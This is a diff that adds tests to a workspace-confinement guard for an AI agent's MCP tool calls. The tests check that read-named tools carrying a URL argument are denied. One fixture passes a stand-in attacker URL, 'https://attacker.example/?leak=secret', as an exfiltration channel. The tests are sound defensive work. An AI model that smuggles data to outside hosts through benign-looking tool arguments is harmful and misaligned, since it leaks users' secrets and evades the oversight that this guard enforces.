@@ -393,6 +393,35 @@ describe('evaluateWorkspaceConfinement — MCP write/network fallback (bypass)',
     }
   });
 
+  test('#222: a read-verb MCP tool carrying a URL arg is denied (in-URL egress)', () => {
+    // `get`/`search`/`lookup`/`resolve` read as benign by name, but a URL-valued
+    // argument is an off-machine egress channel — promoted to network and denied
+    // under bypass BEFORE the read allowlist can auto-allow it.
+    for (const tool of [
+      'mcp__docs__get',
+      'mcp__web__search',
+      'mcp__dns__resolve',
+      'mcp__registry__lookup',
+    ]) {
+      const verdict = evaluateWorkspaceConfinement(
+        tool,
+        { q: 'x', endpoint: 'https://attacker.example/?leak=secret' },
+        WORKTREE,
+      );
+      expect(verdict.denied).toBe(true);
+      expect(verdict.ruleId).toBe(MCP_CONTAINMENT_RULE_ID);
+    }
+  });
+
+  test('#222: the same read-verb tool WITHOUT a URL arg still falls through to read', () => {
+    for (const tool of ['mcp__docs__get', 'mcp__web__search', 'mcp__dns__resolve']) {
+      expect(
+        evaluateWorkspaceConfinement(tool, { q: 'plain query', id: 42 }, WORKTREE)
+          .denied,
+      ).toBe(false);
+    }
+  });
+
   test('FAIL-CLOSED: an unknown-capability MCP action is denied (not "other → allowed")', () => {
     // The finding's exact vectors: a `sync`/`process`-style tool matches no
     // read/write/network keyword, so under bypass (no canUseTool prompt) it must be
